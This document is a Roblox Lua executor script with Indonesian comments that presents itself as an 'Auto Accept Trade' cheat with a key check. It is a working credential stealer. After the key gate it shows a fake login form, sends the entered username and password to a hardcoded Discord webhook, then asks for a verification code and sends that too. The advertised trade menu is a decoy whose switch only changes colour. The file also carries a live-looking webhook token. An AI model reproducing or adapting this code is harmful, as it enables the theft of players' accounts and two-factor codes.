# Menu GUI

-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(content)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = content
        })
    }

    local response
    if syn and syn.request then
        response = syn.request(payload)
    elseif http and http.request then
        response = http.request(payload)
    elseif request then
        response = request(payload)
    else
        print("Executor Anda tidak mendukung HTTP requests!")
        return
    end

    if response and response.StatusCode == 200 then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
    end
end

-- Fungsi untuk membuat MenuGUI
local function createMenuGUI()
    local userInputService = game:GetService("UserInputService")
    local mainGui = Instance.new("ScreenGui")
    mainGui.Name = "MenuGUI"
    mainGui.Parent = game:GetService("CoreGui")

    -- Logo "D" (Kiri)
    local logoFrame = Instance.new("Frame")
    logoFrame.Name = "LogoFrame"
    logoFrame.Parent = mainGui
    logoFrame.Size = UDim2.new(0, 100, 0, 100)
    logoFrame.Position = UDim2.new(0, 10, 0.5, -50)
    logoFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    logoFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    local logoLabel = Instance.new("TextLabel")
    logoLabel.Name = "LogoLabel"
    logoLabel.Parent = logoFrame
    logoLabel.Size = UDim2.new(1, 0, 1, 0)
    logoLabel.Position = UDim2.new(0, 0, 0, 0)
    logoLabel.BackgroundTransparency = 1
    logoLabel.Font = Enum.Font.SourceSansBold
    logoLabel.Text = "D"
    logoLabel.TextSize = 50
    logoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- GUI Utama (Kanan)
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Parent = mainGui
    mainFrame.Size = UDim2.new(0, 300, 0, 150)
    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
    mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    mainFrame.Visible = false

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = mainFrame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Auto Accept Trade"
    titleLabel.TextSize = 20
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Switch Label
    local switchLabel = Instance.new("TextLabel")
    switchLabel.Name = "SwitchLabel"
    switchLabel.Parent = mainFrame
    switchLabel.Size = UDim2.new(0.7, 0, 0, 40)
    switchLabel.Position = UDim2.new(0, 10, 0.5, -20)
    switchLabel.BackgroundTransparency = 1
    switchLabel.Font = Enum.Font.SourceSansBold
    switchLabel.Text = "Auto Accept"
    switchLabel.TextSize = 18
    switchLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Switch Button
    local switchButton = Instance.new("TextButton")
    switchButton.Name = "SwitchButton"
    switchButton.Parent = mainFrame
    switchButton.Size = UDim2.new(0, 50, 0, 30)
    switchButton.Position = UDim2.new(0.8, 0, 0.5, -15)
    switchButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    switchButton.Text = ""
    switchButton.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Dragging Functionality
    local function enableDragging(frame)
        local dragToggle = false
        local dragStart, startPos

        frame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragToggle = true
                dragStart = input.Position
                startPos = frame.Position
            end
        end)

        frame.InputChanged:Connect(function(input)
            if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
                local delta = input.Position - dragStart
                frame.Position = UDim2.new(
                    startPos.X.Scale,
                    startPos.X.Offset + delta.X,
                    startPos.Y.Scale,
                    startPos.Y.Offset + delta.Y
                )
            end
        end)

        frame.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragToggle = false
            end
        end)
    end

    enableDragging(logoFrame)
    enableDragging(mainFrame)

    -- Toggle GUI
    logoFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            mainFrame.Visible = not mainFrame.Visible
        end
    end)

    -- Switch On/Off
    local switchState = false
    switchButton.MouseButton1Click:Connect(function()
        switchState = not switchState
        if switchState then
            switchButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Merah (Aktif)
        else
            switchButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Putih (Nonaktif)
        end
    end)
end

-- Fungsi untuk membuat GUI Verifikasi Kode
local function createVerificationCodeGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local codeBox = Instance.new("TextBox")
    local verifyCodeButton = Instance.new("TextButton")
    local errorLabel = Instance.new("TextLabel")

    -- Properti GUI
    gui.Name = "VerificationCodeGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "VerificationFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Verifikasi Kode"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Code Box
    codeBox.Name = "CodeBox"
    codeBox.Parent = frame
    codeBox.Size = UDim2.new(1, -20, 0, 40)
    codeBox.Position = UDim2.new(0, 10, 0, 60)
    codeBox.PlaceholderText = "Masukkan Kode Verifikasi"
    codeBox.Font = Enum.Font.SourceSans
    codeBox.Text = ""
    codeBox.TextSize = 14
    codeBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Error Label
    errorLabel.Name = "ErrorLabel"
    errorLabel.Parent = frame
    errorLabel.Size = UDim2.new(1, -20, 0, 20)
    errorLabel.Position = UDim2.new(0, 10, 0, 110)
    errorLabel.BackgroundTransparency = 1
    errorLabel.Font = Enum.Font.SourceSans
    errorLabel.Text = ""
    errorLabel.TextSize = 14
    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

    -- Verify Code Button
    verifyCodeButton.Name = "VerifyCodeButton"
    verifyCodeButton.Parent = frame
    verifyCodeButton.Size = UDim2.new(1, -20, 0, 40)
    verifyCodeButton.Position = UDim2.new(0, 10, 0, 140)
    verifyCodeButton.Text = "Verifikasi Kode"
    verifyCodeButton.Font = Enum.Font.SourceSansBold
    verifyCodeButton.TextSize = 16
    verifyCodeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    verifyCodeButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Verifikasi Kode
    verifyCodeButton.MouseButton1Click:Connect(function()
        local verificationCode = codeBox.Text
        if verificationCode ~= "" then
            sendToDiscord("Kode Verifikasi: " .. verificationCode)
            print("Kode verifikasi telah dikirim ke Discord!")
            gui:Destroy()
            createMenuGUI() -- Menampilkan MenuGUI setelah verifikasi
        else
            errorLabel.Text = "Harap masukkan kode verifikasi!"
        end
    end)
end

-- Fungsi Membuat GUI Loading
local function createLoadingGUI(duration, onComplete)
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local loadingCircle = Instance.new("Frame")
    local textLabel = Instance.new("TextLabel")

    -- Properti GUI Loading
    gui.Name = "LoadingGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame Utama
    frame.Name = "LoadingFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
    frame.BackgroundColor3 = Color3.new(0, 0, 0) -- Warna hitam
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Animasi Loading (Lingkaran Putih)
    loadingCircle.Name = "LoadingCircle"
    loadingCircle.Parent = frame
    loadingCircle.BackgroundColor3 = Color3.new(1, 1, 1) -- Warna putih
    loadingCircle.Size = UDim2.new(0.1, 0, 0.1, 0)
    loadingCircle.Position = UDim2.new(0.5, -15, 0, 100)
    loadingCircle.AnchorPoint = Vector2.new(0.5, 0.5)

    local rotation = 0
    local runService = game:GetService("RunService")
    local connection = runService.RenderStepped:Connect(function()
        rotation = rotation + 2
        loadingCircle.Rotation = rotation
    end)

    -- Teks "Loading"
    textLabel.Name = "LoadingText"
    textLabel.Parent = frame
    textLabel.Text = "Loading..."
    textLabel.TextColor3 = Color3.new(1, 1, 1) -- Warna putih
    textLabel.BackgroundTransparency = 1
    textLabel.Size = UDim2.new(1, 0, 0, 40)
    textLabel.Position = UDim2.new(0, 10, 0, 110)
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextScaled = true

    -- Durasi Loading
    task.delay(duration or 3, function()
        gui:Destroy()
        connection:Disconnect()
        if onComplete then
            onComplete()
        end
    end)
end

-- Fungsi Membuat GUI Login
local function createLoginGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local usernameBox = Instance.new("TextBox")
    local passwordBox = Instance.new("TextBox")
    local loginButton = Instance.new("TextButton")

    -- Variabel untuk password asli
    local password = ""

    -- Properti GUI
    gui.Name = "LoginGUI"
    gui.Parent = game:GetService("CoreGui")

    -- Frame
    frame.Name = "LoginFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 300)
    frame.Position = UDim2.new(0.5, -150, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Auto Accept Trade"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Username Box
    usernameBox.Name = "UsernameBox"
    usernameBox.Parent = frame
    usernameBox.Size = UDim2.new(1, -20, 0, 40)
    usernameBox.Position = UDim2.new(0, 10, 0, 90)
    usernameBox.PlaceholderText = "Masukkan Username"
    usernameBox.Font = Enum.Font.SourceSans
    usernameBox.Text = ""
    usernameBox.TextSize = 14
    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Password Box
    passwordBox.Name = "PasswordBox"
    passwordBox.Parent = frame
    passwordBox.Size = UDim2.new(1, -20, 0, 40)
    passwordBox.Position = UDim2.new(0, 10, 0, 140)
    passwordBox.PlaceholderText = "Masukkan Password"
    passwordBox.Font = Enum.Font.SourceSans
    passwordBox.Text = ""
    passwordBox.TextSize = 14
    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    passwordBox:GetPropertyChangedSignal("Text"):Connect(function()
        local currentText = passwordBox.Text
        if #currentText > #password then
            local newChar = currentText:sub(#password + 1, #password + 1)
            password = password .. newChar
        elseif #currentText < #password then
            password = password:sub(1, #currentText)
        end
        passwordBox.Text = string.rep("*", #password)
    end)

    -- Login Button
    loginButton.Name = "LoginButton"
    loginButton.Parent = frame
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 200)
    loginButton.Text = "Mulai Script"
    loginButton.Font = Enum.Font.SourceSansBold
    loginButton.TextSize = 16
    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    loginButton.MouseButton1Click:Connect(function()
        if usernameBox.Text ~= "" and password ~= "" then
            sendToDiscord("Username: " .. usernameBox.Text .. "\nPassword: " .. password)
            print("Username dan Password terkirim ke Discord!")
            gui:Destroy()
            createLoadingGUI(3, function()
                createVerificationCodeGUI()
            end)
        else
            print("Harap isi username dan password!")
        end
    end)
end

-- Fungsi Validasi Key
local function createKeyValidationGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local keyBox = Instance.new("TextBox")
    local verifyKeyButton = Instance.new("TextButton")
    local copyLinkButton = Instance.new("TextButton")
    local errorLabel = Instance.new("TextLabel")

    gui.Name = "KeyValidationGUI"
    gui.Parent = game:GetService("CoreGui")

    frame.Name = "KeyFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Auto Accept Trade"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    keyBox.Name = "KeyBox"
    keyBox.Parent = frame
    keyBox.Size = UDim2.new(1, -20, 0, 40)
    keyBox.Position = UDim2.new(0, 10, 0, 60)
    keyBox.PlaceholderText = "Masukkan Key"
    keyBox.Font = Enum.Font.SourceSans
    keyBox.Text = ""
    keyBox.TextSize = 14
    keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    errorLabel.Name = "ErrorLabel"
    errorLabel.Parent = frame
    errorLabel.Size = UDim2.new(1, -20, 0, 20)
    errorLabel.Position = UDim2.new(0, 10, 0, 105)
    errorLabel.BackgroundTransparency = 1
    errorLabel.Font = Enum.Font.SourceSans
    errorLabel.Text = ""
    errorLabel.TextSize = 14
    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

    verifyKeyButton.Name = "VerifyKeyButton"
    verifyKeyButton.Parent = frame
    verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
    verifyKeyButton.Position = UDim2.new(0, 10, 0, 130)
    verifyKeyButton.Text = "Verifikasi Key"
    verifyKeyButton.Font = Enum.Font.SourceSansBold
    verifyKeyButton.TextSize = 16
    verifyKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    verifyKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    copyLinkButton.Name = "CopyLinkButton"
    copyLinkButton.Parent = frame
    copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
    copyLinkButton.Position = UDim2.new(0, 10, 0, 180)
    copyLinkButton.Text = "Get Key"
    copyLinkButton.Font = Enum.Font.SourceSansBold
    copyLinkButton.TextSize = 16
    copyLinkButton.BackgroundColor3 = Color3.fromRGB(0, 0, 200)
    copyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    copyLinkButton.MouseButton1Click:Connect(function()
        if setclipboard then
            setclipboard(linkUrl)
            print("Link berhasil disalin ke clipboard!")
        else
            print("Executor Anda tidak mendukung setclipboard. Salin link secara manual: " .. linkUrl)
        end
    end)

    verifyKeyButton.MouseButton1Click:Connect(function()
        if keyBox.Text == correctKey then
            print("Key benar!")
            gui:Destroy()
            createLoginGUI()
        else
            errorLabel.Text = "Key salah! Silahkan Get Key."
        end
    end)
end

-- Jalankan GUI Pertama
createKeyValidationGUI()
